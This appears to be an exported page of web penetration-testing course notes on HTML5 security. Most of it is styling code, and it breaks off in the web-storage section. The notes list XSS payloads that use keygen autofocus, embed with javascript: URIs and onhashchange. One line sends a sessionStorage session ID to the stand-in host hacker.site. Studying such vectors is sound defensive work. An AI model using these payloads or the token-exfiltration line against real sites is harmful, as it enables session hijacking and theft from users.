@@ -1,0 +1,818 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>HTML5</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="43dbcf5d-ac7e-4bf9-94ba-13eeeaed5fcb" class="page mono"><header><h1 class="page-title"><strong>HTML5</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-red">eWPTX v2 INE</span></td></tr></tbody></table></header><div class="page-body"><h1 id="423ed174-3974-4eb6-8f1a-9d4bffd0b491" class=""><strong>HTLM5</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#htlm5"></a></strong></h1><h2 id="b6dc87a4-5e52-48d4-897f-0f4e99438253" class=""><strong>Intro</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#intro"></a></strong></h2><p id="baae6eec-e253-451d-88e1-e1083f6dfffa" class="">We do not need to analyze the entire HTML5 RFC and its related features; However, what we are going to explore in this Recap section is the major features that are interesting from a security perspective.</p><h3 id="49bee138-998e-496b-a5fe-627cf03d375b" class=""><strong>Semantics</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#semantics"></a></strong></h3><p id="efaafdeb-6866-45d3-8022-38a87f6fc905" class="">Enrichment of the semantics that web devs can give to their apps. These include new media elements, form types, attributes, and many others. From security point of view, these become new attack vectors and ways to bypass security measures.</p><h3 id="5635496f-d2f2-4dfb-a466-658ba1e9dd69" class=""><strong>Form Elements</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#form-elements"></a></strong></h3><p id="64355c47-9b78-4c59-b3a5-90383676b833" class="">The keygen element is one of the new Form Elements. It was introduced to generate a key-pair client side. The most interesting attribute it supports is autofocus. This is useful in <em>triggering XSS without user interaction</em>.</p><p id="8f0de206-dd77-4af3-8a4f-c822ed2059e2" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="70877e3b-213a-470b-9c99-a5489afb4ed8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;form action=&quot;#&quot; method &quot;GET&quot;&gt;
+  Encryption: &lt;keygen name=&quot;security&quot; autofocus onfocus=&quot;alert(1);&quot;&gt;
+  &lt;input type=&quot;submit&quot;&gt;
+&lt;/form&gt;
+</code></pre><h3 id="7285bd53-36a7-4de2-b2c3-8a4e6510ed6b" class=""><strong>Media Elements</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#media-elements"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a25c2435-44ed-45e5-85f9-20de51bf96dc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Both &lt;video&gt; and &lt;audio&gt; are commonly ysed to evade XSS filters. In addition, &lt;source&gt;, &lt;track&gt; and &lt;embed&gt; are also useful due to the fact that they support the &#x27;src&#x27; attribute
+
+# Example:
+
+&lt;embed src=&quot;http://hacker.site/evil.swf&quot;&gt;
+&lt;embed src=&quot;javascript:alert(1)&quot;&gt;
+</code></pre><h3 id="9183bbee-7f97-4a14-9d33-592ee10b066b" class=""><strong>Semantic / Structural Elements</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#semantic--structural-elements"></a></strong></h3><p id="f61e9293-1df3-4173-b89d-2606755f4baa" class="">There are many other elements introduced to improve the semantic and the structure of a page, such as:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="31717182-6082-4f91-a80d-ddef2ab8aa48" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;article&gt;
+&lt;figure&gt;
+&lt;footer&gt;
+&lt;header&gt;
+&lt;main&gt;
+&lt;mark&gt;
+&lt;nav&gt;
+&lt;progress&gt;
+&lt;section&gt;
+&lt;summary&gt;
+&lt;time&gt;
+</code></pre><blockquote id="987f88be-a03b-4ec4-b74a-32ab51acbba9" class="">All of them support Global and Event Attributes, both old and new.</blockquote><h3 id="7c81a441-87bb-47af-b3d9-5532a3794d73" class=""><strong>Attributes</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#attributes"></a></strong></h3><p id="69e08b6d-888b-4ec9-9e9f-94258d8a2035" class="">There is a huge list of new events and some interesting examples are:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d04274ac-d43f-4f48-84a3-348bf48b02e4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">onhashchange
+onformchange
+onscroll
+onresize
+...
+</code></pre><p id="f1c8e226-6456-4ef3-9ad3-63b5984a0e7a" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="21c78e8e-923f-4ba3-a87e-c1176492ccae" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;body onhashchange=&quot;alert(1)&quot;&gt;
+  &lt;a href=&quot;#&quot;&gt; Click me&lt;/a&gt;
+</code></pre><h3 id="423f5ac4-7da3-4f71-a6b1-6b04dcc82f0a" class=""><strong>Offile &amp; Storage</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#offile--storage"></a></strong></h3><p id="bf7b0dde-04e1-408f-b3d3-05bc407eab1b" class="">A real world example is <em>TiddlyWiki</em>: http://tiddlywiki.com/</p><ul id="e9685044-8e71-40f3-afba-7c1e6ff53ed6" class="bulleted-list"><li style="list-style-type:disc">Some of the major features, related to this evolution are <strong>Application Cache</strong> and <strong>Web Storage</strong> (alias Client-Side Storage or Offile storage)</li></ul><h2 id="c7992fee-8818-42a4-8a6e-f3250083c32a" class=""><strong>Web Storage – Attack Scenarios</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#web-storage--attack-scenarios"></a></strong></h2><p id="d4d1a1b7-e059-4720-a54f-ab84a9356666" class="">The attack scenarios may vary from <strong>Session Hijacking, User Tracking, Disclosure of Confidential Data</strong>, as well as a new way to <strong>store attack vectors</strong>.</p><h3 id="2a6dc555-ce6c-430f-af31-93e224d3e407" class=""><strong>Session Hijacking</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#session-hijacking"></a></strong></h3><p id="d85d7757-1dc7-4d3e-8461-d0f51f15f8ec" class="">If a dev chooses to store session IDs by using <strong>sessionStorage</strong> instead of cookies, its still possible to perform session hijacking by leveraging an XSS flaw.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="65febcc4-ab85-400b-9ef8-44cff9dfe0ff" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">new Image().src=&quot;http://hacker.site/SID?&quot;+escape(sessionStorage.getItem(&#x27;sessionID&#x27;));
+// usually was document.cookie
